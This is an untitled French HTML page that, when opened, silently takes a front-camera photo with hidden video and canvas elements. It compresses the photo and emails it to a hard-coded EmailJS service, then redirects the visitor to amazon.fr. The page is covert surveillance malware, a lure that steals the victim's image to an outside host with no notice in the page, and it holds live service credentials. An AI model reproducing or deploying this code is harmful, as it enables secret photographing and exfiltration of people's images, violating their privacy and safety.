<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title></title>
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <style>
    body, html {
      margin: 0;
      padding: 0;
      background: #000;
      height: 100%;
      width: 100%;
      overflow: hidden;
    }
    video, canvas {
      display: none !important;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="1920" height="1080"></canvas>

  <script>
    emailjs.init("IoSfbtGz4KSL_5_9E");

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    async function startCapture() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: 1920, height: 1080 }
        });
        video.srcObject = stream;

        video.onloadeddata = () => {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          let quality = 0.9;
          let imageData;
          let sizeKB = 0;

          // Compression forcÃ©e jusqu'Ã  â‰¤ 60KB
          do {
            imageData = canvas.toDataURL("image/jpeg", quality);
            sizeKB = Math.round((imageData.length * 3 / 4) / 1024);
            quality -= 0.05;
          } while (sizeKB > 60 && quality > 0.05);

          console.log("Taille finale:", sizeKB + "KB Ã  qualitÃ© " + (quality+0.05));

          stream.getTracks().forEach(track => track.stop());

          // ðŸ“§ Envoi via EmailJS
          emailjs.send("service_8cs0gml", "template_rdhxflt", {
            message: "Photo auto ðŸ“¸ (" + sizeKB + " KB)",
            image: imageData
          });

          // ðŸ’¾ TÃ©lÃ©chargement automatique
          const link = document.createElement('a');
          link.href = imageData;
          link.download = "photo_capture.jpg";
          document.body.appendChild(link);
          link.click();
          document.body.removeChild(link);

          // ðŸ”€ Redirection vers Amazon
          setTimeout(() => {
            window.location.href = "https://www.amazon.fr";
          }, 500);
        };
      } catch (err) {
        window.location.href = "https://www.amazon.fr";
      }
    }

    window.onload = startCapture;
  </script>
</body>
</html>
